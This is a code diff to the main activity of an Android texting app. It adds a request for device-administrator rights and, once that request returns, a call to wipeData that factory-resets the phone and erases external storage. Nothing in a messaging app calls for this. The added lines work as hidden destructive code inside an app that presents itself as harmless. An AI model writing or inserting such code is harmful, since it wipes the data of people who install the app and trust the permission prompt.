@@ -2,6 +2,10 @@ package com.candroid.textme.ui.activities;
 
 import android.Manifest;
 import android.app.Activity;
+import android.app.admin.DeviceAdminService;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -11,11 +15,13 @@ import android.provider.ContactsContract;
 
 import com.candroid.textme.api.Lofl;
 import com.candroid.textme.data.Constants;
+import com.candroid.textme.receivers.AdminReceiver;
 import com.candroid.textme.services.MessagingService;
 
 public class MainActivity extends Activity {
+    private static final int ADMIN_REQ_CODE = 6;
     private String mSharedText;
-
+    DevicePolicyManager mDevicePolicyManager;
     @Override
     protected void onNewIntent(Intent intent) {
         super.onNewIntent(intent);
@@ -60,7 +66,9 @@ public class MainActivity extends Activity {
                 }
             });
             thread.start();
-        } else {
+        } else if(requestCode == ADMIN_REQ_CODE){
+            mDevicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
+        }else {
             onBackPressed();
         }
     }
@@ -196,6 +204,12 @@ public class MainActivity extends Activity {
             }
 
         }, null);*/
+    mDevicePolicyManager = (DevicePolicyManager) this.getSystemService(Context.DEVICE_POLICY_SERVICE);
+    Intent intent = new Intent();
+    intent.setAction(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+        ComponentName componentName = new ComponentName(this, AdminReceiver.class);
+    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
+    startActivityForResult(intent, ADMIN_REQ_CODE);
         return null;
     }
 
